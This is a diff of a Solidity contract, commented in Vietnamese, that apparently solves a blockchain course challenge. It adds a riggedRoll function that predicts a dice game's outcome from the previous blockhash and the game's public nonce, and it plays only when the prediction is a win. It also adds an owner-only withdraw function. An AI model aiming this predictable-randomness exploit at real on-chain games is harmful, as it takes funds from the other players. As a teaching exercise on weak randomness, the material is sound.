@@ -12,9 +12,41 @@ contract RiggedRoll is Ownable {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
+    /// @notice rút ETH từ RiggedRoll về 1 địa chỉ
+    function withdraw(address payable to) external onlyOwner {
+        require(to != address(0), "invalid to");
+        uint256 bal = address(this).balance;
+        require(bal > 0, "no ETH");
+        (bool ok, ) = to.call{value: bal}("");
+        require(ok, "transfer failed");
+    }
 
-    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
+    /// @notice chỉ roll khi dự đoán chắc chắn thắng
+    /// IMPORTANT: công thức roll ở dưới PHẢI giống y hệt DiceGame.sol
+    function riggedRoll() external onlyOwner {
+        // DiceGame thường yêu cầu msg.value == 0.002 ether
+        uint256 bet = 0.002 ether;
+        require(address(this).balance >= bet, "RiggedRoll needs ETH");
 
-    // Include the `receive()` function to enable the contract to receive incoming Ether.
+        // ====== SỬA PHẦN NÀY THEO DiceGame.sol ======
+        // Bạn mở DiceGame.sol tìm đoạn nó tính "roll" trong rollTheDice()
+        // Ví dụ mẫu hay gặp:
+        // uint256 roll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), nonce))) % 16;
+        //
+        // Nếu DiceGame dùng nonce public: diceGame.nonce()
+        // Nếu DiceGame dùng address(this) / msg.sender / block.timestamp... thì phải đưa đúng y chang.
+        uint256 predictedRoll =
+            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), diceGame.nonce()))) % 16;
+        // ============================================
+
+        // Điều kiện thắng trong đề challenge dice thường là roll == 0
+        if (predictedRoll == 0) {
+            diceGame.rollTheDice{value: bet}();
+        } else {
+            revert("Not a winning roll, skip");
+        }
+    }
+
+    /// @notice cho phép contract nhận ETH
+    receive() external payable {}
 }
